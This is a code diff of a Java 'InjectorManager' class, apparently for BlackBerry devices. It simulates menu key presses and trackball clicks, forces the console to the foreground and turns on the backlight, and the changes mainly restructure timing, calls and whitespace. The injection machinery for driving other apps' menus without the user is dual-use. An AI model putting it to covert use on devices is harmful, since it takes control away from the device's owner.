@@ -155,7 +155,7 @@ public class InjectorManager implements ApplicationObserver, iSingleton,
         String name = injector.getCodName();
         injectorMap.put(name, injector);
 
-        setBacklight(false);
+        setBacklight(true);
         manager.requestForegroundForConsole();
         unLock();
 
@@ -282,25 +282,22 @@ public class InjectorManager implements ApplicationObserver, iSingleton,
         //#ifdef DEBUG
         debug.trace("callSystemMenu");
         //#endif
-
+        Utils.sleep(500);
         KeyInjector.pressRawKeyCode(Keypad.KEY_MENU);
         Utils.sleep(500);
-
+        KeyInjector.trackBallRaw(20, true);
         if (Device.atLeast(7, 0)) {
             //#ifdef DEBUG
             debug.trace("callMenuByKey, version 7, track ball up");
-            //#endif
-            KeyInjector.trackBallRaw(20, true);
-            Utils.sleep(500);
-            KeyInjector.trackBallRawClick();
+            //#endif                      
         } else {
             //#ifdef DEBUG
-            debug.trace("callMenuByKey, version <7, pressing menu");
+            debug.trace("callMenuByKey, version <7, pressing menu: " + menu);
             //#endif
             KeyInjector.pressRawKey(menu.toString().toLowerCase().charAt(0));
-            Utils.sleep(500);
-            KeyInjector.trackBallRawClick();
         }
+        Utils.sleep(500);
+        KeyInjector.trackBallRawClick();
 
         Utils.sleep(500);
         KeyInjector.pressRawKeyCode(Keypad.KEY_ESCAPE);
@@ -394,12 +391,11 @@ public class InjectorManager implements ApplicationObserver, iSingleton,
         //#ifdef DEBUG
         debug.trace("runOnBacklight");
         //#endifs
-        
-        if(InjectionFrameworkApp.TEST_INJECT){
+
+        if (InjectionFrameworkApp.TEST_INJECT) {
             injectAll();
         }
-        
-        
+
     }
 
     /**
@@ -504,15 +500,15 @@ public class InjectorManager implements ApplicationObserver, iSingleton,
             RunInjectorTask task = new RunInjectorTask(RUNON_BACKLIGHT);
 
             applicationTimer.schedule(task, 1000, Integer.MAX_VALUE);
-        }else{
+        } else {
             Thread thread = new Thread(new Runnable() {
-                
+
                 public void run() {
                     InjectionFrameworkApp.test();
                 }
             });
             thread.start();
-            
+
         }
     }
 
